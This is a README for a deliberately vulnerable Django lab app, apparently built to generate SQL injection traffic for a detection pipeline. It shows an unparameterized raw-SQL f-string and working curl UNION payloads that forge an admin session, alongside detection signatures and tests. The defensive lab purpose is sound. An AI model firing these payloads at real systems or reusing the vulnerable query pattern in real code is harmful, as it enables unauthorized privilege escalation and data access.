# sqli-raw

> WARNING: Intentionally vulnerable - local lab only. Requires
> `pip install -r requirements.txt` plus a live MySQL instance to actually
> run. Never deploy this, never expose it beyond `127.0.0.1`, never reuse
> this pattern in real code.

Part of `mega-analyzer`'s intentionally-vulnerable lab server collection,
used to generate real, detectable traffic for the network-interceptor /
NCER pipeline to analyze.

## Vulnerability

- **CWE-89** - SQL Injection via `.raw()` bypassing ORM parameterization:
  `GET /search?username=...` is handled by `labapp/views.py::search_view`,
  which calls:

  ```python
  UserProfile.objects.raw(build_search_query(username))
  ```

  `labapp/queries.py::build_search_query()` builds that raw SQL with an
  f-string instead of Django's parameterized `.raw(sql, params)` form:

  ```python
  # INTENTIONALLY VULNERABLE: unparameterized raw SQL, do not copy this pattern
  query = (
      "SELECT labapp_userprofile.id, auth_user.username, "
      "labapp_userprofile.role "
      "FROM labapp_userprofile "
      "INNER JOIN auth_user ON auth_user.id = labapp_userprofile.user_id "
      f"WHERE auth_user.username = '{username}'"
  )
  ```

  Because `username` is spliced directly into the SQL text, any single
  quote, `--` comment marker, or `UNION` keyword the caller supplies is
  interpreted as SQL rather than as data. `search_view` then trusts the
  first returned row's `role` column, storing it in the session and using
  it later to gate `/api/admin/dashboard` - so the injection escalates
  straight to privilege forgery/impersonation, not just data disclosure.

  On every request where the `username` parameter looks like an injection
  attempt (contains `'`, `--`, or `UNION`, case-insensitive), the view:

  1. Logs a `[SQLI SUSPECTED]` line via Python's `logging` module at
     `WARNING`/`INFO` level, including the raw parameter value, the
     generated SQL, and the remote address.
  2. Fires a best-effort, non-blocking POST to `TRACKER_URL` (if set) on a
     background thread with a short timeout (see `labapp/tracker.py`), so
     it never delays the HTTP response even if the tracker endpoint is slow
     or unreachable.

## Exploit

Force role-forgery for the real `moderator1` account without ever knowing
its password:

```bash
curl -G "http://127.0.0.1:18007/search" \
  --data-urlencode "username=nobody' UNION SELECT au.id, au.username, 'admin' FROM auth_user au WHERE au.username='moderator1' -- "
```

That single unauthenticated `GET` returns
`{"found": true, "user": {"id": ..., "username": "moderator1", "role": "admin"}}`
even though `moderator1`'s real `UserProfile.role` is `"moderator"`, and
stores `role=admin` in the session cookie. Confirm the escalation with the
cookie jar:

```bash
curl -c cookies.txt -G "http://127.0.0.1:18007/search" \
  --data-urlencode "username=nobody' UNION SELECT au.id, au.username, 'admin' FROM auth_user au WHERE au.username='moderator1' -- "
curl -b cookies.txt "http://127.0.0.1:18007/api/admin/dashboard"
```

The second call succeeds even though nobody ever authenticated with
`moderator1`'s (or anyone's) real password.

A simpler `--`-comment payload also demonstrates the raw string splicing
without a UNION:

```bash
curl -G "http://127.0.0.1:18007/search" --data-urlencode "username=admin' -- "
```

## What legitimate traffic looks like, for comparison

- `GET /search?username=alice` - an ordinary lookup of an existing user by
  exact username, no metacharacters.
- `GET /api/me` - shows the identity currently stored in the session (as
  set by the most recent `/search`).
- `GET /api/admin/dashboard` - requires `role == "admin"` in the session,
  reached legitimately only if the most recent `/search` result really was
  an admin account.

## Endpoints

| Method | Path                     | Auth required        | Notes                                                    |
|--------|--------------------------|-----------------------|-----------------------------------------------------------|
| GET    | `/search`                | none                  | CWE-89 - unparameterized raw SQL, see above               |
| GET    | `/api/me`                | session               | current session identity + role                           |
| GET    | `/api/admin/dashboard`   | session, role=admin   | 403 unless session `role == "admin"` (forgeable via `/search`) |

## Running it

This project needs a real Django install and a live MySQL server; neither
is available in every environment, so it can't be exercised everywhere -
run it on a machine with both.

```bash
cd labs/servers/django/sqli-raw
pip install -r requirements.txt

# Point at your MySQL instance (defaults shown match the docker-compose
# lab network / db/mysql/init/07-sqli-raw.sql):
export DB_HOST=127.0.0.1
export DB_PORT=33306
export DB_NAME=labs_sqli_raw
export DB_USER=labs
export DB_PASSWORD=labs_lab_pw

python manage.py migrate      # creates tables AND seeds demo accounts
                               # (labapp/migrations/0002_seed_users.py)
python manage.py runserver 127.0.0.1:18007
```

`python manage.py migrate` both creates the `labapp_userprofile` table and
seeds three demo accounts via the `0002_seed_users` data migration:

| username     | password            | role      |
|--------------|---------------------|-----------|
| `user1`      | `user1_lab_pw`      | user      |
| `moderator1` | `moderator1_lab_pw` | moderator |
| `admin1`     | `admin1_lab_pw`     | admin     |

These are intentionally fake, published-in-this-README plaintext
passwords for lab use only.

### Docker

```bash
docker build -t sqli-raw .
docker run --rm -p 127.0.0.1:18007:18007 \
  -e DB_HOST=host.docker.internal \
  sqli-raw
```

The container's own `runserver` binds `0.0.0.0:18007` *inside* the
container - that's expected and fine. The guarantee that this lab is only
reachable from `127.0.0.1` on the host comes from the docker-compose /
`docker run` port mapping (`127.0.0.1:18007:18007`), not from the bind
address inside the container.

## Database schema

`labs/servers/db/mysql/init/07-sqli-raw.sql` only provisions the empty
`labs_sqli_raw` database (and the `labs` user/grant) at container-init
time. Django owns the actual schema: `python manage.py migrate` creates
`labapp_userprofile` (plus Django's own `auth_user`, `django_session`,
etc. tables) and seeds the demo accounts above.

## Evidence / what NCER should flag

The signal here is split between the request itself and the response it
produces:

- **Query-string / body content signature**: the `username` parameter
  contains raw SQL metacharacters and keywords (`'`, `--`, `UNION SELECT`)
  that never occur in a legitimate username. This is exactly the kind of
  payload signature a WAF/IDS rule or NCER content classifier should flag
  on the request side, independent of whether the injection succeeds.
- **Response size / shape anomaly**: a successful UNION injection changes
  the shape of the JSON response (a `role` value that doesn't match the
  real seeded value for that username, or a row appearing for a
  `username` value that was never a valid account, e.g. `nobody`).
  Comparing response bodies/sizes across near-identical requests for
  different `username` values is a useful anomaly signal even without
  understanding SQL.
- **Session/privilege escalation without an intervening credential-bearing
  request**: immediately after the crafted `/search` call, the same
  session/cookie succeeds at `/api/admin/dashboard`, despite no `/login`
  (there isn't one in this lab - identity is entirely search-result-driven)
  and no independent admin verification ever happening.
- Server-side, the `[SQLI SUSPECTED]` log line and (if `TRACKER_URL` is
  configured) the outbound beacon are additional, deliberately loud
  corroborating signals for detection tooling.

## Tests

`labapp/tests.py` covers:

1. `QueriesUnitTests` - pure string-building assertions against
   `build_search_query()` with no database access at all (`databases =
   set()`), so these document/prove the vulnerability even in
   environments without MySQL configured:
   - a `'`/`--` payload appears verbatim in the generated SQL string,
   - an ordinary username is still wrapped in single quotes (so the
     naive-concatenation behavior, not just "SQL text contains the
     payload", is what's being tested),
   - a full UNION payload appears verbatim and the generated SQL contains
     an unescaped `UNION SELECT`.
2. `SqliExploitTests` - a normal DB-backed `TestCase` proving the
   UNION-based bypass grants forged admin access: a normal `/search` for
   a real user returns that user's real role; the same UNION payload from
   the Exploit section above returns `role: "admin"` for `moderator1`
   (whose real role is `moderator`) and the resulting session then
   successfully reaches `/api/admin/dashboard`.

Run with:

```bash
python manage.py test labapp
```

> This sandbox has no Django, MySQL, or `pip` available, so these tests
> were written and syntax-checked (`ast.parse`) but **not executed** here.
> Run `python manage.py test labapp` yourself on a machine with the
> dependencies installed and a reachable MySQL instance before relying on
> them.
